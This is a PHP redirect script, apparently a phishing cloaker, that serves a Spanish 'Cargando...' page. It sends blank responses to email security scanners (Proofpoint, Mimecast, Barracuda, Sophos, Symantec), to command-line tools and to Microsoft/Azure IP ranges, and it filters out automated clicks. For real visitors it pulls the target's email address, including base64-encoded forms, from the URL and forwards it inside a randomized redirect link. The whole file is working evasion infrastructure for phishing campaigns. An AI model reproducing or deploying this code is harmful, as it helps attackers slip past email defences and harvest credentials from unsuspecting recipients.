<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// 1. Bots por User-Agent (Removido 'Outlook-iOS' e 'Microsoft Office' para não barrar clientes reais no celular)
$bot_agents = [
    'msnbot', 'Google-Safety', 'Barracuda', 'Proofpoint',
    'Mimecast', 'Sophos', 'Symantec',
    'curl', 'python-requests', 'Go-http-client',
    'Wget', 'libwww-perl'
];
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(200);
        exit;
    }
}

// 2. Ranges de IP da Microsoft (Removidos blocos muito amplos que afetam redes móveis)
// Mantenha apenas se você tiver certeza de que não deseja tráfego vindo de infraestrutura Azure
$microsoft_ranges = [
    ['20.192.0.0',   '20.255.255.255'],
    ['40.80.0.0',    '40.95.255.255'],
    ['13.64.0.0',    '13.95.255.255'],
    ['52.160.0.0',   '52.191.255.255'],
    ['104.40.0.0',   '104.47.255.255'],
];
$ip_long = ip2long($ip);
if ($ip_long !== false) {
    foreach ($microsoft_ranges as $range) {
        if ($ip_long >= ip2long($range[0]) && $ip_long <= ip2long($range[1])) {
            http_response_code(200);
            exit;
        }
    }
}

// 3. REMOVIDO: $bot_ip_prefixes
// A verificação por prefixos simples (ex: '34.', '35.') foi removida pois bloqueava milhões de IPs legítimos.

// 4. Filtro de timing corrigido (Tolerance para dessincronização de relógio e cliques rápidos)
$sent_time = (int)($_GET['t'] ?? 0);
if ($sent_time > 0) {
    $diff = time() - $sent_time;
    // Só bloqueia se o clique for negativo (futuro) ou extremamente instantâneo (< 1 segundo)
    if ($diff < 1) {
        http_response_code(200);
        exit;
    }
}

$baseUrl = 'https://share.google/yoCsKYCPdA1ESpC2N#';

function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $result;
}

function decodeEmailFromUrl(string $part): string {
    $part = rtrim($part, '=');
    $b64url = str_pad(strtr($part, '-_', '+/'), strlen($part) + (4 - strlen($part) % 4) % 4, '=');
    $decoded = base64_decode($b64url, true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }
    $b64 = str_pad($part, strlen($part) + (4 - strlen($part) % 4) % 4, '=');
    $decoded = base64_decode($b64, true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }
    return '';
}

$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$email = '';

$path  = parse_url($requestUri, PHP_URL_PATH) ?? '';
$parts = explode('/', trim($path, '/'));

foreach ($parts as $part) {
    if (empty($part)) continue;

    $decoded = decodeEmailFromUrl($part);
    if ($decoded !== '') {
        $email = $decoded;
        break;
    }

    if (filter_var($part, FILTER_VALIDATE_EMAIL)) {
        $email = $part;
        break;
    }

    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $part, $m)) {
        $email = $m[1];
        break;
    }
}

if (empty($email)) {
    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
        $email = $matches[1];
    }
}

if (!empty($email)) {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
    ];
} else {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
    ];
}

$randomUrl = $urls[array_rand($urls)];
$waitSeconds = 1;
?>
<!DOCTYPE html>
<html lang="es-419">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Cargando...</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
    height: 100%;
    background: #fff;
    font-family: sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    flex-direction: column;
    gap: 12px;
}
.progress-wrap {
    width: 260px;
    background: #ede9e3;
    border-radius: 1px;
    height: 1px;
    overflow: hidden;
}
.progress-bar {
    height: 100%;
    width: 0%;
    background: #1a4a7a;
    border-radius: 1px;
    transition: width linear;
}
.counter {
    font-size: .85rem;
    color: #6b6560;
}
.counter strong {
    color: #1a4a7a;
    font-weight: 600;
}
</style>
</head>
<body>
<div class="progress-wrap">
    <div class="progress-bar" id="pbar"></div>
</div>
<p class="counter">Redireccionando en <strong id="cnt"><?php echo $waitSeconds; ?></strong> segundo<?php echo $waitSeconds !== 1 ? 's' : ''; ?>…</p>
<script>
(function() {
    var wait = <?php echo $waitSeconds; ?> * 1000;
    var url  = <?php echo json_encode($randomUrl); ?>;
    var bar  = document.getElementById('pbar');
    var cnt  = document.getElementById('cnt');
    var start = performance.now();

    bar.style.transition = 'width ' + (wait / 1000) + 's linear';
    requestAnimationFrame(function() {
        requestAnimationFrame(function() {
            bar.style.width = '100%';
        });
    });

    var interval = setInterval(function() {
        var elapsed = performance.now() - start;
        var remaining = Math.ceil((wait - elapsed) / 1000);
        if (remaining < 1) remaining = 1;
        cnt.textContent = remaining;
    }, 200);

    setTimeout(function() {
        clearInterval(interval);
        window.location.replace(url);
    }, wait);
})();
</script>
</body>
</html>
